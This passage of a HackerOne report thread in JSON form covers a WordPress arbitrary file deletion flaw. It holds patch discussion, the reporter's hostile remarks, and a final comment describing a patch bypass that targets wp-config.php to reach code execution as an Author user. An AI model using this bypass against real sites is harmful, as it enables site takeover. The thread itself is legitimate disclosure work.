(normally only accessed via a pre-3.0 admin screen) will now fail, but I believe that break is worth it here, given both the age of that code and how unlikely it is to be relied upon in the wild.</p>\n\n<p>We try to get consensus from the team when backwards compatibility breaks are necessary. It&#39;s also possible my suggested fix is not the best approach, but this is my progress from tonight so I wanted to update everyone.</p>\n\n<hr>\n\n<p>It&#39;s hard to put into words how frustrating and embarrassing it is for issues to go stale like this one did, from both sides of the issue fwiw. I&#39;m sorry this went ignored. I know my apology means very little, but it needs to be said and I do feel all of these things.</p>\n\n<p>When there is progress, one of us will update here.</p>\n\n<p>Thanks,<br>\n-JJJ</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2938874, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-27T08:35:45.509Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-27T08:35:45.509Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Speaking as me/Slavco personally:\n \nIf you take into consideration the input sanitation approach then you should make sure every place in the core where postmeta key inserting is possible to be sanitized in case of \"thumb\" key. This solution except breaking precious backward compatibility does very little, almost nothing from security aspect. Editors still are able to perform this attack, Authors are able to carry this attack via XMLRPC, what about wordpress-importer enabled setups, ... \n\nAnyone of you doesn't deserve single letter in the form of reply and help due your behavior in the previous reports from my side, but open source and safety of the users world wide are much more important than your ignorance and discrimination especially towards me.\n\n", 
+            "markdown_message": "<p>Speaking as me/Slavco personally:</p>\n\n<p>If you take into consideration the input sanitation approach then you should make sure every place in the core where postmeta key inserting is possible to be sanitized in case of &quot;thumb&quot; key. This solution except breaking precious backward compatibility does very little, almost nothing from security aspect. Editors still are able to perform this attack, Authors are able to carry this attack via XMLRPC, what about wordpress-importer enabled setups, ... </p>\n\n<p>Anyone of you doesn&#39;t deserve single letter in the form of reply and help due your behavior in the previous reports from my side, but open source and safety of the users world wide are much more important than your ignorance and discrimination especially towards me.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2939831, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-28T01:02:24.024Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-28T01:02:24.024Z", 
+            "actor": {
+                "username": "aaroncampbell", 
+                "url": "/aaroncampbell", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/821/6f1bfb789e2f97a2c2ca81a5e6ab6f7b3581ad4a_medium.jpg?1515860728"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hey Slavco,\n\nIt seems like you reached out to someone pointing out that we were on the wrong track with the patch. I agree and we've been working on a very different patch for a most of the day, and when the person pinged me privately it made me realize that we hadn't uploaded the new patch here yet. I'm going to try to get the latest iteration of it and upload it here really soon.\n\nThanks,\nAaron", 
+            "markdown_message": "<p>Hey Slavco,</p>\n\n<p>It seems like you reached out to someone pointing out that we were on the wrong track with the patch. I agree and we&#39;ve been working on a very different patch for a most of the day, and when the person pinged me privately it made me realize that we hadn&#39;t uploaded the new patch here yet. I&#39;m going to try to get the latest iteration of it and upload it here really soon.</p>\n\n<p>Thanks,<br>\nAaron</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2943179, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/313/067/acd2d5c8e482c8776e79340b185d59b3c4b647bb/291878.diff?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWS2CSUE3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221727Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDNFtI3gdfN0FFddCnSK3A%2FNn8rGoRLECenibnPQxlYfOkhD533uSo6Jsi4CGisj6U81IFoE7NBEuPv%2BUT2dP%2BOOfq6zDsTXqsfa%2B9BuuRNIyl27dmo7gw2zBlEjVTSMZKI8B0zj4q4GeD0gX7YDUvrqCnrwfrQpq6BHV5kFcBvzP%2FNnVou4jydvq2EcrKGQeGmq4afFHwdD5CN5DoFnFHkXlCLPVWCK%2FpO5NMVMdWRvVyk90BTGTkyTY5IWuz0%2B08qqd5UcN1WLfvK4E3S6jTn5eK%2FSX5o5meFKi0SmtPddLVR5u8xNOgccHPaVXRO5KIBBCZ5yilpXGFhVd%2FmfBeI1lJ6Zc7kOal7ihq3TcrVPP%2FopjPjQdAVdt9an7SXkRFGjCeWjyWfPwghBaIoGvWhM9OHPkS94WN%2FukqeEoK1pVo2cJuAYnallyv%2Fvqjndvr%2BodZqbfFrY5T9ebirMMIoriCBo2Xkpz9lw7EjTK4aWQBSBYrDh4Xl4%2FXmR8N0VkEu6LxpbUd0lfl%2Fjh1nqnK2KhGRbixj81Rq6v9WRwhjH%2FADPcK25w6aq3rFp1RLV%2B6mj273p2%2FLR6yf68LZuCXsY5sDs2Xf0oo46m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=04e3f3ae4c49ee38819886c107cbd5037a30b681c0e4e30704a12dc752453e9c", 
+                    "type": "text/x-diff", 
+                    "id": 313067, 
+                    "filename": "291878.diff"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2018-06-28T01:20:40.071Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-28T01:20:40.071Z", 
+            "actor": {
+                "username": "aaroncampbell", 
+                "url": "/aaroncampbell", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/821/6f1bfb789e2f97a2c2ca81a5e6ab6f7b3581ad4a_medium.jpg?1515860728"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Here's another patch @slavco, can you take a look and tell me what you think? It brings the enforcement to where the unlinking is actually happening.\n\nIt looks like the plan will be to push out an update early next week. When this is all fixed and pushed out, we'd still like to look into some additional hardening to `wp_delete_file` and heavier usage of it throughout the codebase, but that will be a longer process.", 
+            "markdown_message": "<p>Here&#39;s another patch <a href=\"/slavco\">@slavco</a>, can you take a look and tell me what you think? It brings the enforcement to where the unlinking is actually happening.</p>\n\n<p>It looks like the plan will be to push out an update early next week. When this is all fixed and pushed out, we&#39;d still like to look into some additional hardening to <code>wp_delete_file</code> and heavier usage of it throughout the codebase, but that will be a longer process.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2943327, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/313/233/436345b8e75c696b4c3a53ce326ad918ce31c54f/291878.diff?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWS2CSUE3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221727Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDNFtI3gdfN0FFddCnSK3A%2FNn8rGoRLECenibnPQxlYfOkhD533uSo6Jsi4CGisj6U81IFoE7NBEuPv%2BUT2dP%2BOOfq6zDsTXqsfa%2B9BuuRNIyl27dmo7gw2zBlEjVTSMZKI8B0zj4q4GeD0gX7YDUvrqCnrwfrQpq6BHV5kFcBvzP%2FNnVou4jydvq2EcrKGQeGmq4afFHwdD5CN5DoFnFHkXlCLPVWCK%2FpO5NMVMdWRvVyk90BTGTkyTY5IWuz0%2B08qqd5UcN1WLfvK4E3S6jTn5eK%2FSX5o5meFKi0SmtPddLVR5u8xNOgccHPaVXRO5KIBBCZ5yilpXGFhVd%2FmfBeI1lJ6Zc7kOal7ihq3TcrVPP%2FopjPjQdAVdt9an7SXkRFGjCeWjyWfPwghBaIoGvWhM9OHPkS94WN%2FukqeEoK1pVo2cJuAYnallyv%2Fvqjndvr%2BodZqbfFrY5T9ebirMMIoriCBo2Xkpz9lw7EjTK4aWQBSBYrDh4Xl4%2FXmR8N0VkEu6LxpbUd0lfl%2Fjh1nqnK2KhGRbixj81Rq6v9WRwhjH%2FADPcK25w6aq3rFp1RLV%2B6mj273p2%2FLR6yf68LZuCXsY5sDs2Xf0oo46m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c64060395de70a58574b05ed7917733decd83c0c1e43586f6b38d95573c209ba", 
+                    "type": "text/x-diff", 
+                    "id": 313233, 
+                    "filename": "291878.diff"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2018-06-28T13:41:26.520Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-28T13:41:26.520Z", 
+            "actor": {
+                "username": "aaroncampbell", 
+                "url": "/aaroncampbell", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/821/6f1bfb789e2f97a2c2ca81a5e6ab6f7b3581ad4a_medium.jpg?1515860728"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "There was a copy/paste error on like 30 in that last patch. Here is the fixed version.", 
+            "markdown_message": "<p>There was a copy/paste error on like 30 in that last patch. Here is the fixed version.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2946533, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-29T12:46:15.424Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-29T12:46:15.424Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Solution isn't good at all. Stay tuned I'll explain in details in 3 months from now. ", 
+            "markdown_message": "<p>Solution isn&#39;t good at all. Stay tuned I&#39;ll explain in details in 3 months from now. </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2958861, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-29T13:26:36.928Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-29T13:26:36.928Z", 
+            "actor": {
+                "username": "aaroncampbell", 
+                "url": "/aaroncampbell", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/821/6f1bfb789e2f97a2c2ca81a5e6ab6f7b3581ad4a_medium.jpg?1515860728"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hey Slavco,\n\nWhile I like to think I appreciate sarcasm and snark as much as most, it certainly makes our job harder here. I understand that you're frustrated at the time this report took, but when you asked for a timeframe 5 months ago I estimated 6 months saying \"it should be fixed by the end of July\" and you said that was fine (well, you gave it a \"+1\").\n\nWe didn't get the full 6 months because of the RIPS post, but we really would like to get a reliable solution in place for a release next week. Any actionable feedback would be appreciated.\n\nThanks,\nAaron", 
+            "markdown_message": "<p>Hey Slavco,</p>\n\n<p>While I like to think I appreciate sarcasm and snark as much as most, it certainly makes our job harder here. I understand that you&#39;re frustrated at the time this report took, but when you asked for a timeframe 5 months ago I estimated 6 months saying &quot;it should be fixed by the end of July&quot; and you said that was fine (well, you gave it a &quot;+1&quot;).</p>\n\n<p>We didn&#39;t get the full 6 months because of the RIPS post, but we really would like to get a reliable solution in place for a release next week. Any actionable feedback would be appreciated.</p>\n\n<p>Thanks,<br>\nAaron</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2958953, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-29T16:20:14.590Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-29T16:21:12.825Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Now we are talking! \nI'm really happy I see you have start counting, that is good habit especially when you handle security of the most popular web project. What is said on this report here https://hackerone.com/reports/253495 , m? \nI'm also more than pleased I'm reading that my feedback \"would be appreciated\" due the fact wasn't the case in the past. See this https://hackerone.com/reports/179920 .\nRegarding discrimination I would also like to point out to the DB prepare method debacle for you, you have acknowledge and gave reward to the person who rewrite my own work and that makes you a thief!  Yes Aaron, you personally and Matt because you are the man responsible for security of the WordPress and Matt as person who put you there. \nNow you can see that I'm not frustrated at all, opposite I'm happy seeing you in this position and that is the result of my battle towards you (not personally, but as authority ) which is noble and makes internet safer place while shows you in the real light.\nIs this strange to you? Maybe I doesn't sound as a person who answered on your emails while I was reporting prepare issue on security at wordpress ? I'm the same, you and your attitude is changed, but you have overlooked very important thing and that is the one I'm not under you in the hierarchy, but we are the same, due the fact I'm the REPORTER and RESEARCHER! \nNow you can fix everything you have messed up right there https://hackerone.com/reports/179920 and feel free to contact me on any communication channel, I don't bite, I audit code ;)\n\np.s. \nSolution isn't good at all. Stay tuned I'll explain in details in 1 ( not 3 because you show little regret regarding the situation you put wp in) month from now.", 
+            "markdown_message": "<p>Now we are talking! <br>\nI&#39;m really happy I see you have start counting, that is good habit especially when you handle security of the most popular web project. What is said on this report here <a title=\"https://hackerone.com/reports/253495\" href=\"https://hackerone.com/reports/253495\">https://hackerone.com/reports/253495</a> , m? <br>\nI&#39;m also more than pleased I&#39;m reading that my feedback &quot;would be appreciated&quot; due the fact wasn&#39;t the case in the past. See this <a title=\"https://hackerone.com/reports/179920\" href=\"https://hackerone.com/reports/179920\">https://hackerone.com/reports/179920</a> .<br>\nRegarding discrimination I would also like to point out to the DB prepare method debacle for you, you have acknowledge and gave reward to the person who rewrite my own work and that makes you a thief!  Yes Aaron, you personally and Matt because you are the man responsible for security of the WordPress and Matt as person who put you there. <br>\nNow you can see that I&#39;m not frustrated at all, opposite I&#39;m happy seeing you in this position and that is the result of my battle towards you (not personally, but as authority ) which is noble and makes internet safer place while shows you in the real light.<br>\nIs this strange to you? Maybe I doesn&#39;t sound as a person who answered on your emails while I was reporting prepare issue on security at wordpress ? I&#39;m the same, you and your attitude is changed, but you have overlooked very important thing and that is the one I&#39;m not under you in the hierarchy, but we are the same, due the fact I&#39;m the REPORTER and RESEARCHER! <br>\nNow you can fix everything you have messed up right there <a title=\"https://hackerone.com/reports/179920\" href=\"https://hackerone.com/reports/179920\">https://hackerone.com/reports/179920</a> and feel free to contact me on any communication channel, I don&#39;t bite, I audit code ;)</p>\n\n<p>p.s. <br>\nSolution isn&#39;t good at all. Stay tuned I&#39;ll explain in details in 1 ( not 3 because you show little regret regarding the situation you put wp in) month from now.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2959435, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-29T19:01:36.422Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-29T19:01:36.422Z", 
+            "actor": {
+                "username": "aaroncampbell", 
+                "url": "/aaroncampbell", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/821/6f1bfb789e2f97a2c2ca81a5e6ab6f7b3581ad4a_medium.jpg?1515860728"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hey @slavco,\n\nAs of right now, we are targeting early next week to release a WordPress update to fix this. Obviously we don't want to release a solution that doesn't fix the issue, and we would really like to work with you on this issue. Any constructive feedback you are able to supply before then, whether in details or patches, would be greatly appreciated!\n\n-Aaron", 
+            "markdown_message": "<p>Hey <a href=\"/slavco\">@slavco</a>,</p>\n\n<p>As of right now, we are targeting early next week to release a WordPress update to fix this. Obviously we don&#39;t want to release a solution that doesn&#39;t fix the issue, and we would really like to work with you on this issue. Any constructive feedback you are able to supply before then, whether in details or patches, would be greatly appreciated!</p>\n\n<p>-Aaron</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2959976, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-30T20:56:42.201Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-30T20:56:42.201Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Oh, you understood nothing! Please read carefully [again](https://hackerone.com/bugs?subject=user&report_id=291878&view=open&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=triaged&substates%5B%5D=pre-submission&reported_to_team=&text_query=&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=25&page=1#activity-2959435) You really can't notice that shameless thief without any regret who always place the guilty towards another people means nothing to me? ", 
+            "markdown_message": "<p>Oh, you understood nothing! Please read carefully <a href=\"https://hackerone.com/bugs?subject=user&amp;report_id=291878&amp;view=open&amp;substates%5B%5D=new&amp;substates%5B%5D=needs-more-info&amp;substates%5B%5D=triaged&amp;substates%5B%5D=pre-submission&amp;reported_to_team=&amp;text_query=&amp;program_states%5B%5D=2&amp;program_states%5B%5D=3&amp;program_states%5B%5D=4&amp;program_states%5B%5D=5&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1#activity-2959435\">again</a> You really can&#39;t notice that shameless thief without any regret who always place the guilty towards another people means nothing to me? </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2966670, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-30T21:22:32.638Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-30T21:22:32.638Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Fool me [once](https://hackerone.com/reports/179920), shame on you. Fool me twice, shame on me (reports 253495 & 29187). ", 
+            "markdown_message": "<p>Fool me <a href=\"https://hackerone.com/reports/179920\">once</a>, shame on you. Fool me twice, shame on me (reports 253495 &amp; 29187). </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2966703, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-02T16:02:38.747Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-02T16:02:38.747Z", 
+            "actor": {
+                "username": "johnbillion", 
+                "url": "/johnbillion", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/083/d2aa5d94732da736a08f022dba3f393e01312ee6_medium.jpg?1484683288"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 2975073, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854"
+            }, 
+            "created_at": "2018-07-05T20:13:15.682Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-05T20:13:15.682Z", 
+            "actor": {
+                "username": "aaroncampbell", 
+                "url": "/aaroncampbell", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/821/6f1bfb789e2f97a2c2ca81a5e6ab6f7b3581ad4a_medium.jpg?1515860728"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hey @slavco,\n\nI'm closing this as resolved as the release with the fix in it has gone out:\nhttps://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/\nhttps://make.wordpress.org/core/2018/07/05/wordpress-4-9-7/\n\nThank you for your work in finding and reporting this issue. You were credited in both posts accordingly.\n\n-Aaron", 
+            "markdown_message": "<p>Hey <a href=\"/slavco\">@slavco</a>,</p>\n\n<p>I&#39;m closing this as resolved as the release with the fix in it has gone out:<br>\n<a title=\"https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/\" href=\"/redirect?signature=df17a1c984242b3ef320d07155b9135ed8058fb2&amp;url=https%3A%2F%2Fwordpress.org%2Fnews%2F2018%2F07%2Fwordpress-4-9-7-security-and-maintenance-release%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"https://make.wordpress.org/core/2018/07/05/wordpress-4-9-7/\" href=\"/redirect?signature=c0d97ad3a9f4ff51fef846e4e0371859f571f969&amp;url=https%3A%2F%2Fmake.wordpress.org%2Fcore%2F2018%2F07%2F05%2Fwordpress-4-9-7%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://make.wordpress.org/core/2018/07/05/wordpress-4-9-7/</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Thank you for your work in finding and reporting this issue. You were credited in both posts accordingly.</p>\n\n<p>-Aaron</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 2995708, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-05T20:16:07.959Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-05T20:16:07.959Z", 
+            "actor": {
+                "url": "/wordpress", 
+                "profile": {
+                    "name": "WordPress"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/055/a7e722c23dedc020ade3b6e7f1a96baa455f86d8_medium.jpg?1392934661"
+                }
+            }, 
+            "team_handle": "wordpress", 
+            "message": "This report is not eligible for bounty because the reporter disclosed publicly before the issue was resolved \u2013 https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/", 
+            "markdown_message": "<p>This report is not eligible for bounty because the reporter disclosed publicly before the issue was resolved \u2013 <a title=\"https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/\" href=\"/redirect?signature=28031c44cfbacb4a058e950b4ea5d5da3e482499&amp;url=https%3A%2F%2Fblog.ripstech.com%2F2018%2Fwordpress-file-delete-to-code-execution%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::NotEligibleForBounty", 
+            "id": 2995714, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-05T21:15:28.806Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-05T21:15:28.806Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Good, I just want to ask, does upload directory for different users is different or all of them upload under `.../uploads/2018/07/` ? Told you that solution doesn't seems good to me and to wait one month...", 
+            "markdown_message": "<p>Good, I just want to ask, does upload directory for different users is different or all of them upload under <code>.../uploads/2018/07/</code> ? Told you that solution doesn&#39;t seems good to me and to wait one month...</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2995982, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-05T23:22:09.909Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-05T23:22:09.909Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Btw, there is much more, but... Congrats for resolving the issue! \np.s. Don't drink while you push for updates towards 30% of the web, you could make mistakes.  ", 
+            "markdown_message": "<p>Btw, there is much more, but... Congrats for resolving the issue! <br>\np.s. Don&#39;t drink while you push for updates towards 30% of the web, you could make mistakes.  </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2996613, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-27T16:22:09.555Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-27T16:22:09.555Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "In 8 days it is a month. Do you plan to fix this issue or? ", 
+            "markdown_message": "<p>In 8 days it is a month. Do you plan to fix this issue or? </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3106087, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-30T10:58:45.646Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-30T10:58:45.646Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "I'm not talking regarding https://medium.com/websec/wordpress-4-9-7-and-evil-author-with-scotch-bd77a83ac39c the solution you provide doesn't protect the wp from first reported issue.  ", 
+            "markdown_message": "<p>I&#39;m not talking regarding <a title=\"https://medium.com/websec/wordpress-4-9-7-and-evil-author-with-scotch-bd77a83ac39c\" href=\"/redirect?signature=4c3c306bf66943781b08405ea1789bb229bc138e&amp;url=https%3A%2F%2Fmedium.com%2Fwebsec%2Fwordpress-4-9-7-and-evil-author-with-scotch-bd77a83ac39c\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://medium.com/websec/wordpress-4-9-7-and-evil-author-with-scotch-bd77a83ac39c</span><i class=\"icon-external-link\"></i></a> the solution you provide doesn&#39;t protect the wp from first reported issue.  </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3116144, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-30T13:47:01.602Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-30T13:47:01.602Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "first_to_agree": true, 
+            "message": "Function `_wp_attached_file` says:\n```\n$thumbfile = path_join( $uploadpath['basedir'], $thumbfile );\n$thumbdir  = path_join( $uploadpath['basedir'], dirname( $file ) );\n```\n`$file` is taken from DB/meta `_wp_attached_file` \n`dirname` - doesn't check the file system\n\nSo the current patch prevents many of the attacking payloads, but one is missed. The one which is missed is:\n`$file` with value from root directory having a `thumb` that is `wp-config.php` \nYes this is RCE via Author user!\n", 
+            "markdown_message": "<p>Function <code>_wp_attached_file</code> says:</p>\n<pre class=\"highlight plaintext\"><code>$thumbfile = path_join( $uploadpath[&#39;basedir&#39;], $thumbfile );\n$thumbdir  = path_join( $uploadpath[&#39;basedir&#39;], dirname( $file ) );\n</code></pre>\n<p><code>$file</code> is taken from DB/meta <code>_wp_attached_file</code> <br>\n<code>dirname</code> - doesn&#39;t check the file system</p>\n\n<p>So the current patch prevents many of the attacking payloads, but one is missed. The one which is missed is:<br>\n<code>$file</code> with value from root directory having a <code>thumb</code> that is <code>wp-config.php</code> <br>\nYes this is RCE via Author user!</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3116709, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-30T13:57:57.508Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-30T13:57:57.508Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
